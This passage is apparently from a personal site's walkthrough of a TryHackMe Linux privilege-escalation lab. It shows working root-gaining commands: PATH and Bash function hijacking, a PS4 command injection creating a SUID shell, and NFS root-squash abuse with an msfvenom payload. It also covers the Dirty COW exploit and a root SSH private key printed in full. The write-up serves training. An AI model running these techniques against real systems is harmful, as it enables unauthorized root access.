+<p>Now all we need to do is prepend the directory where our malicious binary is located to the PATH variable and then execute the <em>suid-env</em> binary again to gain root privileges.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="go">PATH=/tmp:$PATH</span>
+</code></pre></div>
+<img alt="SUID Environment Variables PrivEsc" src="../../../assets/images/thm/linuxprivesc/57-suid_env_privesc.png" /></p>
+<h2 id="task-14-suidsgid-executables-abusing-shell-features-1">Task 14 - SUID/SGID Executables - Abusing Shell Features (#1)<a class="headerlink" href="#task-14-suidsgid-executables-abusing-shell-features-1" title="Permanent link">&para;</a></h2>
+<p>In this task, the <em>suid-env</em> has been updated to use absolute path of the <em>service</em> executable (<code>/usr/sbin/service</code>) to start the <em>apache2</em> webserver. We can verify this by running the <em>strings</em> utility on the new binary <em>sudo-env2</em>.</p>
+<p><img alt="Shell Feature 1 Strings" src="../../../assets/images/thm/linuxprivesc/58-shell_escape_1_strings.png" /></p>
+<p>We cannot rely on the previous method using Environment Variables to get privilege escalation.</p>
+<p>In this task, we will be looking we will exploiting a feature in Bash (versions &lt; 4.2-048) which make it possible to define shell functions with names that resemble file paths. By exporting these functions, binaries in the vulnerable versions of Bash could be forced to use the exported functions instead of the actual executable at that file path.</p>
+<p>Let's see this in action. We first need to verify the version of Bash installed on the machine.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="go">/bin/bash --version</span>
+</code></pre></div>
+<img alt="Shell Feature 1 Bash Version" src="../../../assets/images/thm/linuxprivesc/59-shell_escape_1_bashver.png" /></p>
+<p>Looks like the Bash version running on the machine is vulnerable to this attack.</p>
+<p>Let's create a Bash function and export it with the name <code>/usr/sbin/service</code> that executes a new Bash shell (using -p to retain permissions).</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="k">function</span><span class="w"> </span>/usr/sbin/service<span class="w"> </span><span class="o">{</span><span class="w"> </span>/bin/bash<span class="w"> </span>-p<span class="p">;</span><span class="w"> </span><span class="o">}</span>
+<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nb">export</span><span class="w"> </span>-f<span class="w"> </span>/usr/sbin/service
+</code></pre></div>
+Once the function is exported, run the <em>suid-env2</em> binary to gain a root shell.</p>
+<p><img alt="Shell Feature 1 PrivEsc" src="../../../assets/images/thm/linuxprivesc/60-shell_escape_1_privesc.png" /></p>
+<h2 id="task-15-suidsgid-executables-abusing-shell-features-2">Task 15 - SUID/SGID Executables - Abusing Shell Features (#2)<a class="headerlink" href="#task-15-suidsgid-executables-abusing-shell-features-2" title="Permanent link">&para;</a></h2>
+<p>In this task, we will be abusing the debugging mode in Bash shell (version &lt; 4.4). Bash versions less than 4.4 uses the environment variable <em>PS4</em> to display an extra prompt for debugging statements. Debugging statements can be used to embed commands which present an privilege escalation vector for attackers.</p>
+<p>Let's run the <code>/usr/local/bin/suid-env2</code> binary with Bash debugging enabled and the <em>PS4</em> variable set to an embedded command wich creates an SUID version of <code>/bin/bash</code>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>env<span class="w"> </span>-i<span class="w"> </span><span class="nv">SHELLOPTS</span><span class="o">=</span>xtrace<span class="w"> </span><span class="nv">PS4</span><span class="o">=</span><span class="s1">&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39;</span><span class="w"> </span>/usr/local/bin/suid-env2
+</code></pre></div>
+<img alt="Shell Feature 2 Debug Mode" src="../../../assets/images/thm/linuxprivesc/61-shell_escape_2_debug.png" /></p>
+<p>We can then run the <em>rootbash</em> binary with the <code>-p</code> argument to get root privileges.</p>
+<p><img alt="Shell Feature 2 PrivEsc" src="../../../assets/images/thm/linuxprivesc/62-shell_escape_2_privesc.png" /></p>
+<h2 id="task-16-password-keys-history-files">Task 16 - Password &amp; Keys - History Files<a class="headerlink" href="#task-16-password-keys-history-files" title="Permanent link">&para;</a></h2>
+<p>It is not uncommon for Linux users to accidentally type their password on the command line instead of into a password prompt. As most Linux shells keep a history of user input, these passwords may get recorded in a history file. It is worthwhile going through these history files to see what you can find as a low hanging fruit.</p>
+<p>We can view contents of all the hidden history files in the user's directory using the following command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="go">cat ~/.*history | less</span>
+</code></pre></div>
+<h2 id="task-17-password-keys-config-files">Task 17 - Password &amp; Keys - Config Files<a class="headerlink" href="#task-17-password-keys-config-files" title="Permanent link">&para;</a></h2>
+<p>Configuration files often contain passwords in plaintext or other reversible formats. Enumerating the services present on the machine can help direct attackers to relevant config files to parse for credentials.</p>
+<p>Let's look at an example for OpenVPN service.</p>
+<p><img alt="OpenVPN Config File Content" src="../../../assets/images/thm/linuxprivesc/63-openvpn_config.png" /></p>
+<p>The OpenVPN config file contains a reference to another location where the root user's credentials can be found.</p>
+<p><img alt="OpenVPN Root Creds" src="../../../assets/images/thm/linuxprivesc/64-openvpn_creds.png" /></p>
+<h2 id="task-18-passwords-keys-ssh-keys">Task 18 - Passwords &amp; Keys - SSH Keys<a class="headerlink" href="#task-18-passwords-keys-ssh-keys" title="Permanent link">&para;</a></h2>
+<p>Users may mistakenly make backups of important files without taking precautions to save guard them with correct permissions.</p>
+<p>We can look for hidden files and directories in the system root by using the <code>ls -la /</code> command. One less common privilege escalation vector in practical engagements (more common in CTF challenges) is the presence of a user's private SSH key.</p>
+<p>Listing the hidden files and directories on our target system, we find a hidden <code>.ssh</code> directory with a globally readable private SSH key for the root user (<em>root_key</em>).</p>
+<p><img alt="SSH Private Key" src="../../../assets/images/thm/linuxprivesc/65-ssh_key.png" /></p>
+<p>We can copy the contents of the private key to a similarly named file on our local system and give it appropriate permissions.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>-----BEGIN RSA PRIVATE KEY-----
+<a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
+<a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
+<a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
+<a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
+<a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
+<a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
+<a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a>NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
+<a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
+<a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a>5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
+<a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
+<a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
+<a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a>6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
+<a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
+<a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a>824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
+<a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a>Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
+<a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
+<a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a>Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
+<a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a>SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
+<a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a>d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
+<a id="__codelineno-55-21" name="__codelineno-55-21" href="#__codelineno-55-21"></a>jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
+<a id="__codelineno-55-22" name="__codelineno-55-22" href="#__codelineno-55-22"></a>871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
+<a id="__codelineno-55-23" name="__codelineno-55-23" href="#__codelineno-55-23"></a>X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
+<a id="__codelineno-55-24" name="__codelineno-55-24" href="#__codelineno-55-24"></a>CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
+<a id="__codelineno-55-25" name="__codelineno-55-25" href="#__codelineno-55-25"></a>Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
+<a id="__codelineno-55-26" name="__codelineno-55-26" href="#__codelineno-55-26"></a>LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
+<a id="__codelineno-55-27" name="__codelineno-55-27" href="#__codelineno-55-27"></a>-----END RSA PRIVATE KEY-----
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="go">chmod 600 root_key</span>
+</code></pre></div>
+<img alt="SSH Private Key Copied" src="../../../assets/images/thm/linuxprivesc/66-ssh_key_copied.png" /></p>
+<p>We can now SSH into the machine using the private key as root. Note that for this task, the private key does not have a password configured. In most sceneries, a private SSH key would have been configured with a password which would need to be cracked using <em>John the Ripper</em>.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="go">ssh -i root_key root@10.10.114.180 -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa</span>
+</code></pre></div>
+Also note that due to the age of the machine, we needed to add additional parameters indicating the key type and algorithm which aren't necessarily required for more modern systems.</p>
+<p><img alt="SSH PrivEsc" src="../../../assets/images/thm/linuxprivesc/67-ssh_privesc.png" /></p>
+<h2 id="task-19-nfs">Task 19 - NFS<a class="headerlink" href="#task-19-nfs" title="Permanent link">&para;</a></h2>
+<p>Files created via NFS inherit the remote user's ID. If the user is root, and <em>root squashing</em> is enabled, the ID will instead be set to the <em>nobody</em> user.</p>
+<p>In our task, we can check the NFS share configuration on the machine using the following command:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="go">cat /etc/exports</span>
+</code></pre></div>
+<img alt="NFS Configuration" src="../../../assets/images/thm/linuxprivesc/68-nfs.png" /></p>
+<p>Note that in our case, the <code>/tmp</code> share has root squashing disabled. On our machine, we can now switch to the root user, create a mount point, and mound the <code>/tmp</code> share as indicated below.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="go">mkdir /tmp/nfs</span>
+<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="go">mount -o rw, vers=3 10.10.114.180:/tmp /tmp/nfs</span>
+</code></pre></div>
+<img alt="NFS Mount" src="../../../assets/images/thm/linuxprivesc/69-nfs_mount.png" /></p>
+<p>We can now use <em>msfvenom</em> to create a payload which executes <code>/bin/bash</code> with the <code>-p</code> option to retain permissions.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="go">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</span>
+</code></pre></div>
+Mark the payload as executable and set SUID permissions.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="go">chmod +xs /tmp/nfs/shell.elf</span>
+</code></pre></div>
+<img alt="NFS Shell" src="../../../assets/images/thm/linuxprivesc/70-nfs_shell.png" /></p>
+<p>Now back on our target machine, we can execute the payload in the <code>/tmp</code> share folder to get our privilege escalation.</p>
+<p><img alt="NFS PrivEsc" src="../../../assets/images/thm/linuxprivesc/71-nfs_privesc.png" /></p>
+<h2 id="task-20-kernel-exploits">Task 20 - Kernel Exploits<a class="headerlink" href="#task-20-kernel-exploits" title="Permanent link">&para;</a></h2>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Kernel exploits can leave the system in an unstable state and should be only ran as a last resort.</p>
+</div>
+<p>On our target system, we can run the <a href="https://github.com/jondonas/linux-exploit-suggester-2">Linux Exploit Suggester 2</a> tool to identify potential kernel exploits on the current system.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="go">perl /tmp/linux-exploit-suggester-2.pl</span>
+</code></pre></div>
+<img alt="Linux Exploit Suggester 2" src="../../../assets/images/thm/linuxprivesc/72-kernel_exploit.png" /></p>
+<p>The popular Linux kernel exploit <em>Dirty COW</em> is listed as one of the suggested exploits. We can obtain the exploit from <a href="https://www.exploit-db.com/raw/40839">Exploit-DB Dirty COW</a>. Let's compile the code and run it. Note that hte exploit may take several minutes to complete.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="go">gcc -pthread /tmp/c0w.c -o c0w</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="go">./c0w</span>
+</code></pre></div>
+Once the exploit completes, we can run <code>/usr/bin/passwd</code> to gain root privileges.</p>
+<p><img alt="Dirty COW" src="../../../assets/images/thm/linuxprivesc/73-kernel_exploit_dirtycow.png" /></p>
+<h2 id="task-21-privilege-escalation-scripts">Task 21 - Privilege Escalation Scripts<a class="headerlink" href="#task-21-privilege-escalation-scripts" title="Permanent link">&para;</a></h2>
+<p>There are several scripts available which can aid us in finding and identifying possible privilege escalation vectors on Linux. Below is a list of some useful scripts:</p>
+<ul>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></li>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh">Linux Smart Enumeration</a></li>
+<li><a href="https://github.com/jondonas/linux-exploit-suggester-2">Linux Exploit Suggester 2</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 27, 2024</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../kenobi/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Kenobi">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Kenobi
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../metasploitexploitation/" class="md-footer__link md-footer__link--next" aria-label="Next: Metasploit - Exploitation">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Metasploit - Exploitation
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2024 Nouman Noor
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/nanoor" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://ca.linkedin.com/in/nouman-noor-60193727" target="_blank" rel="noopener" title="ca.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
